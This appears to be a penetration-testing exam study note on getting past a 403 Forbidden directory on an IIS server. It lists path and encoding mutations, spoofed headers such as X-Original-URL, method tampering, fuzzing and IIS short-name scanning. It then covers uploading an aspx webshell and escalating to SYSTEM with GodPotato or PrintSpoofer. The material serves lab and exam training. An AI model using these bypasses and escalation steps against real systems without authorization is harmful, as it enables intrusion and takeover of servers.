# ⛔ Scenario 07 — 403 Forbidden Directory (bypass + discover what's behind it)

> **Given:** a web box returning **403 Forbidden** on a restricted directory. The error (*"Access is denied… using the credentials you supplied"*) is the classic **IIS** 403 page → Windows/IIS. Goal: get past the 403, find what it's guarding, exploit it → SYSTEM. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]] · [[Web Enumeration]]. Foothold: [[Web Exploitation]] · [[File Upload]] · [[RCE]]. Then: [[Windows Privilege Escalation]] · [[Credential Attacks]].

```bash
export IP=<TARGET_IP> URL="http://$IP/<restricted_dir>" ; mkdir -p loot
```

---

## 🧠 WHAT A 403 ACTUALLY MEANS
**403 = "this exists, but you're not allowed here."** Unlike a 404, it *confirms* there's something worth reaching — an admin area, an upload dir, a backup, an app. Two independent attacks:
1. **Bypass the 403** on the directory itself (path/header/method tricks).
2. **Ignore the directory, reach the files inside it** — the *listing* is blocked, but a **named file** under it (`/restricted/config.php`, `/restricted/upload.aspx`) is often served fine.

> **Why both:** access control is usually applied to the **path as written**. Change how you write the path, change the method, or ask for a specific file, and the rule frequently doesn't match. The IIS hint also unlocks Windows-specific filename tricks (below).

---

## 1️⃣ CONFIRM + MAP
```bash
sudo nmap -sC -sV -p- $IP -oN nmap/services.txt
whatweb http://$IP/ ; curl -sI "$URL"                 # confirm IIS + the 403
curl -s -X OPTIONS "$URL" -i | grep -i allow          # which methods are allowed?
```

## 2️⃣ BYPASS THE 403 — path & character tricks
Try each against the restricted path (automate with a wordlist in `ffuf`):
```
/restricted        /restricted/        /restricted//        /restricted/.
/restricted/./      /./restricted/      /restricted/..;/     /restricted;/
/restricted%2f      /%2e/restricted     /restricted%20       /restricted%09
/restricted.        /restricted..%2f    /RESTRICTED  /Restricted   (case)
/restricted/index.php  (guess an inner file directly)
```
```bash
# scripted brute of common bypass mutations:
ffuf -w /usr/share/seclists/Discovery/Web-Content/403-bypass.txt -u "http://$IP/FUZZ" -mc 200,301,302
# or a dedicated tool: byp4xx / bypass-403 / 4-ZERO-3  "$URL"
```

## 3️⃣ BYPASS BY HEADER (IP/ACL-based 403s)
If the 403 is an **IP allowlist**, forge the source:
```bash
for h in "X-Forwarded-For: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" \
         "X-Original-URL: /<restricted_dir>" "X-Rewrite-URL: /<restricted_dir>" \
         "X-Custom-IP-Authorization: 127.0.0.1" "Referer: http://$IP/<restricted_dir>"; do
  echo "== $h =="; curl -s -o /dev/null -w "%{http_code}\n" -H "$h" "http://$IP/"
done
```
`X-Original-URL` / `X-Rewrite-URL` are especially effective on **IIS/.NET** — request an allowed path but point the header at the restricted one.

## 4️⃣ METHOD TAMPERING
```bash
for m in GET POST HEAD PUT OPTIONS TRACE DELETE FOO; do
  echo -n "$m -> "; curl -s -o /dev/null -w "%{http_code}\n" -X "$m" "$URL"; done
```
A different verb (or a bogus one) sometimes isn't covered by the deny rule.

## 5️⃣ DISCOVER FILES *UNDER* THE 403 (often the real win)
The directory is blocked; its contents may not be. Fuzz **inside** it:
```bash
feroxbuster -u "$URL/" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x aspx,asp,php,config,txt,bak
```
**IIS-specific filename recovery** (the error page says IIS):
- **Short-name (8.3) enumeration** — the IIS `~` tilde trick reveals hidden names: `shortscan http://$IP/` / `iis_shortname_scanner`. Expand `ADMIN~1` → the real file.
- Tricks: trailing `::$DATA` (`/file.aspx::$DATA`), trailing dot/space, Unicode/double-encoding.

---

## 6️⃣ WHAT YOU FIND → FOOTHOLD
Whatever the 403 was hiding is now your surface:
| Behind the 403 | Route |
|---|---|
| Admin panel / login | default/weak creds → [[Credential Attacks]] |
| Upload / file manager | webshell (`.aspx` on IIS) → [[File Upload]] · [[RCE]] |
| App + version | `searchsploit`/CVE → PoC → [[Web Exploitation]] |
| Config / backup / source | creds → RDP/WinRM/SMB reuse |
| WebDAV (`PUT` allowed from §4) | `PUT shell.aspx` → browse it |

Land as the IIS app user → **`whoami /priv` → `SeImpersonate` → GodPotato/PrintSpoofer → SYSTEM** ([[Windows Privilege Escalation]]).

---

## 🗺️ DECISION FLOW
```
403 on /restricted  (IIS)
   ├─ path/char tricks (ffuf 403-bypass list, byp4xx)
   ├─ header spoof (X-Forwarded-For / X-Original-URL / X-Rewrite-URL)
   ├─ method tamper (POST/HEAD/OPTIONS/bogus)
   └─ fuzz FILES under it (+ IIS short-name 8.3 scan)
            ▼
   reach the hidden content ──► admin / upload / app / config
            ▼
   foothold (webshell / CVE / creds) ──► IIS app user
            ▼
   whoami /priv ──► SeImpersonate ──► GodPotato ──► SYSTEM ✅
```

## 🚧 STUCK?
1. No bypass works on the **path** → pivot entirely to **fuzzing files inside** it; the dir index being blocked doesn't block known files.
2. Run the **IIS short-name scanner** — it leaks the first 6 chars of hidden files/dirs even when everything returns 403.
3. Re-scan all ports; the real foothold may be a **different service** and the 403 a decoy.
4. Try the bypass set through **Burp** so you can tamper precisely.
→ [[Stuck — What Now]] · [[Standalone Boxes — Exam Solve Guide]].

## 🧠 ONE-LINE LESSON
**A 403 is a "something's here" beacon: bypass the path (slashes/dots/case, `X-Original-URL`, method swap) or — more reliably — fuzz the files inside it (plus IIS 8.3 short-name recovery); whatever was hidden is the foothold, then `SeImpersonate` → SYSTEM.**
